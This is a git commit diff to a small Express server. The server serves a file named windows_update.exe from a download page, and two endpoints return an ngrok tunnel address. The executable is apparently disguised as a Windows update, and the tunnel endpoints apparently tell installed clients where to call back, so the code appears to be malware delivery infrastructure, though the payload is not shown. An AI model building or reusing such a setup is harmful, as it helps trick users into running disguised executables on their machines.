319a416d531012d265bcafb7ea5e43bbdfaf1e94
radio server <radioserver98@gmail.com>
2023-03-11 12:39:07 -0300

    download html

--- index.js
+++ index.js
@@ -2,13 +2,24 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 4500;
 
+app.all('/ok', (req, res) => {
+    res.send('https://0b4f-190-192-75-210.sa.ngrok.io')
+})
+
 app.all('/url', (req, res) => {
     res.send('https://0b4f-190-192-75-210.sa.ngrok.io')
 })
 
-app.get('/download', function (req, res) {
-    const file = `${__dirname}/windows_update.exe`;
-    res.download(file);
+app.get('/download-file', function (req, res) {
+    res.download(`${__dirname}/download/windows_update.exe`, function(err) {
+        if(err) {
+            console.log(err);
+        }
+    })
+});
+
+app.get('/', function (req, res) {
+    res.sendFile(`${__dirname}/download/index.html`);
 });
 
 app.listen(PORT)
